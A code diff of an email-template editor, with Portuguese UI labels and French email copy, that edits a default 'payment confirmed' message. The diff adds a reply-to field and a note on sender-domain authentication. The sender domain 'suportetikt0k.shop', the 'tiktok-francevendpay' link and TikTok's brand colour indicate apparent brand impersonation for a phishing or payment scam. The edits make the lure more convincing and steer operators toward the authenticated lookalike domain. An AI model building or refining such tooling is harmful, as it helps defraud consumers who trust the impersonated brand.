@@ -52,18 +52,19 @@ const EMPTY: Draft = {
   id: "",
   name: "Nouveau modèle",
   product_id: null,
-  subject: "Félicitations ! Votre achat a été confirmé 🎉",
-  from_name: "Support",
-  from_email: "support@suportetikt0k.shop",
-  heading: "Félicitations !",
-  intro: "Votre paiement a bien été approuvé.",
+  subject: "Confirmation de votre commande {{commande}}",
+  from_name: "Support Financier",
+  from_email: "support@notify.suportetikt0k.shop",
+  reply_to: "support@notify.suportetikt0k.shop",
+  heading: "Votre commande est confirmée",
+  intro: "Bonjour {{nom}}, votre paiement a bien été reçu.",
   body_text:
-    "Merci pour votre confiance. Votre accès est disponible immédiatement en cliquant sur le bouton ci-dessous.",
-  button_label: "ACCÉDER À MON PRODUIT",
+    "Votre accès est disponible dès maintenant. Utilisez le bouton ci-dessous pour ouvrir le suivi de votre demande.\n\nConservez cet e-mail : il contient le lien d'accès à votre commande.",
+  button_label: "Accéder au suivi de ma demande",
   deliverable_url: "https://tiktok-francevendpay.lovable.app/entregavel",
   fallback_note:
     "Si le bouton ne fonctionne pas, copiez et collez ce lien dans votre navigateur :",
-  signature: "L'équipe Support",
+  signature: "Équipe Support\nsupport@notify.suportetikt0k.shop",
   accent_color: "#fe2c55",
   active: false,
   is_default: false,
@@ -215,6 +216,18 @@ function EnvioEmailsPage() {
                     />
                   </Field>
                 </div>
+
+                <Field label="Responder para (reply-to)">
+                  <Input
+                    value={draft.reply_to ?? ""}
+                    placeholder="support@notify.suportetikt0k.shop"
+                    onChange={(e) => set("reply_to", e.target.value || null)}
+                  />
+                </Field>
+                <p className="-mt-1 text-xs text-muted-foreground">
+                  Use sempre endereços @notify.suportetikt0k.shop — é o único domínio autenticado
+                  (SPF/DKIM/DMARC). Outros domínios são substituídos automaticamente no envio.
+                </p>
 
                 <Field label="Título">
                   <Input value={draft.heading} onChange={(e) => set("heading", e.target.value)} />
